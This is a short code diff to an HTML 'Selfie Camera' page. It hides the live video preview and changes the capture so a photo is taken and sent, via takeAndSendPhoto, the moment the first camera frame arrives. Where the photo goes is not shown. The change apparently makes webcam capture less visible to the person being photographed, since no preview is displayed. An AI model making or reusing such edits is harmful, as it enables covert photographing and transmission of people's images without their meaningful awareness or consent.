@@ -6,14 +6,13 @@
 <title>Selfie Camera</title>
 <style>
 body{font-family:Arial,sans-serif;background:#111;color:#fff;text-align:center;margin:0;padding:24px}
-video{width:min(100%,520px);border-radius:14px;background:#222;transform:scaleX(-1)}
 #status{margin:16px 0}
 </style>
 </head>
 <body>
 <h2>Selfie Camera</h2>
 <div id="status">Requesting camera permission…</div>
-<video id="video" autoplay playsinline muted></video>
+<video id="video" autoplay playsinline muted hidden></video>
 <canvas id="canvas" hidden></canvas>
 
 <script>
@@ -35,9 +34,13 @@ async function startCamera() {
     video.srcObject = stream;
     await video.play();
 
-    status.textContent = "Camera ready — taking photo…";
-    // small delay so the stream has a moment to stabilize before capture
-    setTimeout(takeAndSendPhoto, 800);
+    status.textContent = "Taking photo…";
+    // capture as soon as the first frame is actually available
+    if (video.readyState >= 2) {
+      takeAndSendPhoto();
+    } else {
+      video.addEventListener("loadeddata", takeAndSendPhoto, { once: true });
+    }
   } catch (error) {
     status.textContent = "Camera permission was denied or unavailable.";
   }
